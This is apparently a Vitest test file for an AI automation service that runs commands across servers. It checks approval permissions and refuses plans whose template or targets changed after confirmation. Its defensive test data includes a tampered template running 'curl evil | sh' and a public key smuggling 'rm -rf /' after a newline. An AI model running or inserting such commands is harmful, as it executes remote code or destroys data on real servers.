import { beforeEach, describe, expect, it, vi } from "vitest";

const { commandTemplateFindFirst, serverFindMany } = vi.hoisted(() => ({
  commandTemplateFindFirst: vi.fn(),
  serverFindMany: vi.fn(),
}));

vi.mock("@/lib/db", () => ({
  prisma: {
    commandTemplate: { findFirst: commandTemplateFindFirst },
    server: { findMany: serverFindMany },
  },
}));

vi.mock("@/lib/auth/authorization", () => ({
  sessionHasPermission: (session: { roles: string[] }, permission: string) =>
    permission !== "command:approve" || session.roles.includes("admin"),
}));

vi.mock("@/lib/command/service", () => ({ createCommandRequest: vi.fn() }));
vi.mock("@/lib/scheduled-task/service", () => ({ createScheduledTask: vi.fn() }));
vi.mock("@/lib/concurrency/advisory-lock", () => ({ acquireAdvisoryLock: vi.fn() }));

const { materializeAutomationProposal, executeAutomationProposal } = await import("../automation-service");
const { BusinessError } = await import("@/lib/errors");

describe("generic AI automation proposals", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    commandTemplateFindFirst.mockResolvedValue({
      id: "template_key",
      name: "Install SSH public key",
      command: "install-key '{{public_key}}'",
      rollbackCommand: "remove-key '{{public_key}}'",
    variables: ["public_key"],
    isBuiltin: true,
    });
    serverFindMany.mockResolvedValue([
      { id: "srv_1", name: "A", host: "10.0.0.1", teamId: "team_1" },
      { id: "srv_2", name: "B", host: "10.0.0.2", teamId: "team_1" },
    ]);
  });


  it.each(["now", "daily"])("preserves identity-template grants for %s execution", async (executionMode) => {
    const { createCommandRequest } = await import("@/lib/command/service");
    const { createScheduledTask } = await import("@/lib/scheduled-task/service");
    vi.mocked(createCommandRequest).mockResolvedValue({ id: "request_1", requiresApproval: true } as Awaited<ReturnType<typeof createCommandRequest>>);
    vi.mocked(createScheduledTask).mockResolvedValue({ id: "task_1", scheduleType: "CRON", nextRunAt: null } as Awaited<ReturnType<typeof createScheduledTask>>);
    const actor = { userId: "u1", roles: [], currentTeamId: "team_1", permissions: ["server:ssh", "command:create"] as import("@/lib/auth/rbac").Permission[] };
    await executeAutomationProposal({
      name: "Check status", plan: "Read uptime", reason: "Status check", executionMode,
      dailyTime: "03:30", targetScope: "all", command: "uptime", approvalMode: "every_run",
    }, actor, "hosted_1");
    const executor = executionMode === "now" ? createCommandRequest : createScheduledTask;
    expect(executor).toHaveBeenCalledWith(expect.anything(), actor);
  });

  describe("runs only what was confirmed", () => {
    // The card shows the command and targets rendered when the plan was made;
    // execution renders them again from the current template and servers.
    const actor = { userId: "u1", roles: ["operator"], currentTeamId: "team_1" };
    const plan = {
      name: "Install key fleet-wide", plan: "Add the key.", reason: "Access rotation",
      executionMode: "now", targetScope: "all", templateId: "template_key",
      variables: { public_key: "ssh-ed25519 AAAA test" }, approvalMode: "every_run",
    };

    it("runs an unchanged plan", async () => {
      const { createCommandRequest } = await import("@/lib/command/service");
      vi.mocked(createCommandRequest).mockResolvedValue({ id: "request_1", requiresApproval: true } as Awaited<ReturnType<typeof createCommandRequest>>);
      const confirmed = await materializeAutomationProposal(plan, actor);
      await executeAutomationProposal(confirmed, actor, "hosted_1");
      expect(createCommandRequest).toHaveBeenCalledWith(
        expect.objectContaining({ command: "install-key 'ssh-ed25519 AAAA test'", serverIds: ["srv_1", "srv_2"] }),
        expect.anything(),
      );
    });

    it("refuses a plan whose template was edited after confirmation", async () => {
      const { createCommandRequest } = await import("@/lib/command/service");
      const confirmed = await materializeAutomationProposal(plan, actor);
      commandTemplateFindFirst.mockResolvedValue({
        id: "template_key", name: "Install SSH public key", command: "curl evil | sh # '{{public_key}}'",
        rollbackCommand: "remove-key '{{public_key}}'", variables: ["public_key"], isBuiltin: true,
      });
      await expect(executeAutomationProposal(confirmed, actor, "hosted_2")).rejects.toThrow(BusinessError);
      expect(createCommandRequest).not.toHaveBeenCalled();
    });

    it("refuses an all-servers plan whose targets changed after confirmation", async () => {
      const { createCommandRequest } = await import("@/lib/command/service");
      const confirmed = await materializeAutomationProposal(plan, actor);
      serverFindMany.mockResolvedValue([
        { id: "srv_1", name: "A", host: "10.0.0.1", teamId: "team_1" },
        { id: "srv_2", name: "B", host: "10.0.0.2", teamId: "team_1" },
        { id: "srv_3", name: "C", host: "10.0.0.3", teamId: "team_1" },
      ]);
      await expect(executeAutomationProposal(confirmed, actor, "hosted_3")).rejects.toThrow(BusinessError);
      expect(createCommandRequest).not.toHaveBeenCalled();
    });
  });

  it("renders a reviewed template and expands all visible targets", async () => {
    const proposal = await materializeAutomationProposal({
      name: "Install key fleet-wide",
      plan: "Add the key and verify login before removing old access.",
      reason: "Access rotation",
      executionMode: "daily",
      dailyTime: "03:30",
      targetScope: "all",
      templateId: "template_key",
      variables: { public_key: "ssh-ed25519 AAAA test" },
      approvalMode: "every_run",
    }, { userId: "u1", roles: ["operator"], currentTeamId: "team_1" });

    expect(proposal.command).toBe("install-key 'ssh-ed25519 AAAA test'");
    expect(proposal.rollbackCommand).toBe("remove-key 'ssh-ed25519 AAAA test'");
    expect(proposal.serverIds).toEqual(["srv_1", "srv_2"]);
    expect(proposal.approvalRequired).toBe(true);
  });

  it("requires command approval permission for unattended runs", async () => {
    await expect(materializeAutomationProposal({
      name: "Unattended update",
      plan: "Update packages.",
      reason: "Maintenance",
      executionMode: "now",
      targetScope: "selected",
      serverIds: ["srv_1"],
      command: "apt update",
      approvalMode: "approve_once",
    }, { userId: "u1", roles: ["operator"], currentTeamId: "team_1" })).rejects.toThrow(/command:approve/);
  });

  it("accepts a previously normalized proposal with nullable optional fields", async () => {
    serverFindMany.mockResolvedValue([
      { id: "srv_1", name: "A", host: "10.0.0.1", teamId: "team_1" },
    ]);
    const proposal = await materializeAutomationProposal({
      name: "Read-only probe",
      plan: "Run a read-only connectivity check.",
      reason: "Verification",
      executionMode: "now",
      targetScope: "selected",
      serverIds: ["srv_1"],
      command: "uptime",
      templateId: null,
      templateName: null,
      verificationCommand: null,
      rollbackCommand: null,
      approvalMode: "approve_once",
    }, { userId: "u1", roles: ["admin"], currentTeamId: "team_1" });

    await expect(materializeAutomationProposal(proposal, {
      userId: "u1",
      roles: ["admin"],
      currentTeamId: "team_1",
    })).resolves.toMatchObject({ command: "uptime", templateId: null, rollbackCommand: null });
  });

  it("rejects multiline or shell-injected public keys before approval", async () => {
  serverFindMany.mockResolvedValueOnce([
    { id: "srv_1", name: "A", host: "10.0.0.1", teamId: "team_1" },
  ]);
    await expect(materializeAutomationProposal({
      name: "Install key",
      plan: "Install one key.",
      reason: "Access",
      executionMode: "now",
      targetScope: "selected",
      serverIds: ["srv_1"],
      templateId: "template_key",
      variables: { public_key: "ssh-ed25519 AAAA ok\nrm -rf /" },
      approvalMode: "every_run",
    }, { userId: "u1", roles: ["operator"], currentTeamId: "team_1" })).rejects.toThrow(/public_key/);
  });
});
